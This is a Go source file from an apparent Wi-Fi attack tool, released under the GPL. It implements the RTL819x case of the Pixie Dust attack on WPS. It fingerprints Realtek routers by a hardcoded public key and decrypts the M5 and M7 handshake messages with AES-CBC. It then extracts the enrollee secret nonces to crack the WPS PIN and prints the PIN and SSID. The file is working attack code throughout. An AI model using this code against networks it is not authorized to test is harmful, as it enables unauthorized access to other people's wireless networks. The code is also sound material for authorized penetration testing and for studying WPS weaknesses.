/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"errors"
	"fmt"
	"offscan/internal/utils"
	"slices"
)



func (pda *pixieDustAttack) executeRTL819xCase() {
	if len(pda.m7enc) == 0 { return }
	pda.rtl819xReqFlags()
	pda.computeDHKey()
	pda.setKDK()
	pda.kdf()
	pda.decryptM7()
	pda.decryptM5()

	if pda.hasAllRTLdata() {
		pda.emptyPinHMAC()
		pda.findESecrets()
		pda.crackFirstHalf([]byte{})
		pda.crackSecondHalf()
	}

	pda.displayTime()
	pda.displaySSIDFromM7()
	pda.displayPIN()
}



func (pda *pixieDustAttack) checkRTL819xPKE() {
	var wpsRtlPke = []byte{
		0xD0,0x14,0x1B,0x15, 0x65,0x6E,0x96,0xB8, 0x5F,0xCE,0xAD,0x2E, 0x8E,0x76,0x33,0x0D,
		0x2B,0x1A,0xC1,0x57, 0x6B,0xB0,0x26,0xE7, 0xA3,0x28,0xC0,0xE1, 0xBA,0xF8,0xCF,0x91,
		0x66,0x43,0x71,0x17, 0x4C,0x08,0xEE,0x12, 0xEC,0x92,0xB0,0x51, 0x9C,0x54,0x87,0x9F,
		0x21,0x25,0x5B,0xE5, 0xA8,0x77,0x0E,0x1F, 0xA1,0x88,0x04,0x70, 0xEF,0x42,0x3C,0x90,
		0xE3,0x4D,0x78,0x47, 0xA6,0xFC,0xB4,0x92, 0x45,0x63,0xD1,0xAF, 0x1D,0xB0,0xC4,0x81,
		0xEA,0xD9,0x85,0x2C, 0x51,0x9B,0xF1,0xDD, 0x42,0x9C,0x16,0x39, 0x51,0xCF,0x69,0x18,
		0x1B,0x13,0x2A,0xEA, 0x2A,0x36,0x84,0xCA, 0xF3,0x5B,0xC5,0x4A, 0xCA,0x1B,0x20,0xC8,
		0x8B,0xB3,0xB7,0x33, 0x9F,0xF7,0xD5,0x6E, 0x09,0x13,0x9D,0x77, 0xF0,0xAC,0x58,0x07,
		0x90,0x97,0x93,0x82, 0x51,0xDB,0xBE,0x75, 0xE8,0x67,0x15,0xCC, 0x6B,0x7C,0x0C,0xA9,
		0x45,0xFa,0x8D,0xD8, 0xD6,0x61,0xBE,0xB7, 0x3B,0x41,0x40,0x32, 0x79,0x8D,0xAD,0xEE,
		0x32,0xB5,0xDD,0x61, 0xBF,0x10,0x5F,0x18, 0xD8,0x92,0x17,0x76, 0x0B,0x75,0xC5,0xD9,
		0x66,0xA5,0xA4,0x90, 0x47,0x2C,0xEB,0xA9, 0xE3,0xB4,0x22,0x4F, 0x3D,0x89,0xFB,0x2B,
	}

    pda.isRTL819x = bytes.Equal(pda.pke, wpsRtlPke)
}



func (pda *pixieDustAttack) rtl819xReqFlags() {
	if !slices.Contains(pda.modes, 3) { 
		utils.Abort("Mode 3 (RTL819x case) not selected")
	}
	
	if len(pda.rNonce) == 0 || len(pda.ebssid) == 0 {
		utils.Abort("Registrar Nonce (R-Nonce) and/or EBSSID not found")
	}

	if !pda.isRTL819x {
        utils.Abort("Model not supported! (PKE does not match RTL819x)")
    }
}



func (pda *pixieDustAttack) isGlibc() bool {
	return len(pda.eNonce) >= 16 && 
	       pda.eNonce[0] < 0x80 &&  
		   pda.eNonce[4] < 0x80 &&
           pda.eNonce[8] < 0x80 && 
		   pda.eNonce[12] < 0x80
}




func (pda *pixieDustAttack) decryptEncryptedSettings(encr []byte) []byte {
    const blockSize = 16

	if len(pda.wrapKey) != 16 {
	    utils.Abort("Error while decrypting (--m7enc/--m5enc). key must be 16 bytes for AES-128")
	}

	// AES-128-CBC
    if len(encr) < 2 * blockSize || len(encr) % blockSize != 0 {
        utils.Abort("Invalid encrypted data length")
    }

    iv         := encr[:blockSize]
    ciphertext := encr[blockSize:]

    block, err := aes.NewCipher(pda.wrapKey)
    if err != nil {
        utils.Abort(fmt.Sprintf("%v", err))
    }

    mode      := cipher.NewCBCDecrypter(block, iv)
    plaintext := make([]byte, len(ciphertext))
	lenText   := len(plaintext)
    mode.CryptBlocks(plaintext, ciphertext)

    padLen := int(plaintext[lenText - 1])
    if padLen == 0 || padLen > lenText {
        utils.Abort("Invalid padding")
    }

    for i := lenText - padLen; i < lenText; i++ {
        if plaintext[i] != byte(padLen) {
            utils.Abort("Invalid padding")
        }
    }

    return plaintext[:lenText - padLen]
}


func (pda *pixieDustAttack) decryptM5() {
	pda.decrypted5 = pda.decryptEncryptedSettings(pda.m5enc)
	pda.m5enc      = nil
}



func (pda *pixieDustAttack) decryptM7() {
	pda.decrypted7 = pda.decryptEncryptedSettings(pda.m7enc)
	pda.m7enc      = nil
}



func findVTag(data []byte, targetID uint16, targetLen int) ([]byte, error) {
    for i := 0; i+4 <= len(data); {
        id     := binary.BigEndian.Uint16(data[i : i+2])
        length := int(binary.BigEndian.Uint16(data[i+2 : i+4]))

        if i+4+length > len(data) {
            return nil, errors.New("Invalid TLV: length exceeds buffer")
        }
        
        if id == targetID && (targetLen == 0 || length == targetLen) {
            return data[i+4 : i+4+length], nil
        }
        
        i += 4 + length
    }

    return nil, errors.New("Tag not found")
}



func (pda *pixieDustAttack) hasAllRTLdata() bool {
	ok := pda.decrypted5 != nil
	ok  = ok && pda.decrypted7 != nil
	ok  = ok && pda.eHash1 != nil
	ok  = ok && pda.eHash2 != nil
	
	return ok
}



func (pda *pixieDustAttack) findESecrets() {
	pda.eSecret1 = extractSecret(pda.decrypted5, 0x1016, "E-SNONCE 1")
	pda.eSecret2 = extractSecret(pda.decrypted7, 0x1017, "E-SNONCE 2")
}



func extractSecret(data []byte, tagID uint16, fieldName string) []byte {
    secret, err := findVTag(data, tagID, wpsNonceLen)

    if err != nil {
        utils.Abort(fmt.Sprintf("Tag %s not found in decrypted data: %v", fieldName, err))
    }

    return secret
}



func (pda *pixieDustAttack) displaySSIDFromM7() {
	ssidTag, err := findVTag(pda.decrypted7, 0x1045, 0)
	
	if err == nil {
	    ssid := string(ssidTag)
	    fmt.Printf("[*] SSID: %s\n", ssid)
	}
}